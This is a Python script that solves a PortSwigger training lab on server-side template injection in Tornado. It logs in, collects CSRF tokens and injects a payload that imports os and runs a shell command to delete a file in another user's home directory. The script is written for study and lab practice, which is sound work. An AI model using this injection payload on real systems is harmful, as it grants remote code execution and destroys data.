#!/usr/bin/env python

'''This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.
You can log in to your own account using the following credentials: wiener:peter

Lab link: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context
'''

import requests
from bs4 import BeautifulSoup


s = requests.session()

lab_id = '0a5e008a0383ad4181c2a20d004400dd' #change based on generated lab

# First we need to login as wiener:peter as provided in the instructions
uri = f"https://{lab_id}.web-security-academy.net/login"
r = s.get(uri) 
soup = BeautifulSoup(r.text, 'lxml')
token = soup.find('input', {'name': 'csrf'})['value'] #login csrf token

# Submit this data in next the post request to login
data = { 'username' : "wiener",
        'password' : "peter",
        'csrf': token
}

# Once logged in, get the next csrf token we will need (we should be on the my_account page from the login redirect)
r2 = s.post(uri, data=data)
soup = BeautifulSoup(r2.text, 'lxml')
token = soup.find('input', {'name': 'csrf'})['value'] #account csrf token

# Now send the malicious SSTI request in the vulnerable "blog-post-author-display" param at the "change-blog-post-author-display" endpoint from "my-account"
uri = f"https://{lab_id}.web-security-academy.net/my-account/change-blog-post-author-display"
data = { 'blog-post-author-display' : "user.nickname}}{% import os %}{{os.system('rm /home/carlos/morale.txt')}}",
        'csrf' : token
}
r3 = s.post(uri, data=data)

# Go to the first blog page in order to get the csrf token we will need for the next step
uri = f"https://{lab_id}.web-security-academy.net/post?postId=1"
r4 = s.get(uri)
soup = BeautifulSoup(r4.text, 'lxml')
token = soup.find('input', {'name': 'csrf'})['value'] #blog page csrf token

# Make a new post in order to display/trigger our malicious SSTI code from earlier
uri = f"https://{lab_id}.web-security-academy.net/post/comment"
data = { 'csrf' : token,
        'postId' : 1,
        'comment' : "hacked"
}
r5 = s.post(uri, data=data)


# Now check and see if the above worked from the solved flag
uri = f"https://{lab_id}.web-security-academy.net/post?postId=1"
r6 = s.get(uri)
uri = f"https://{lab_id}.web-security-academy.net/"
r7 = s.get(uri)
if "Congratulations" in r7.text:
    print("solved")
else:
    print("nope")
    print(r7.text)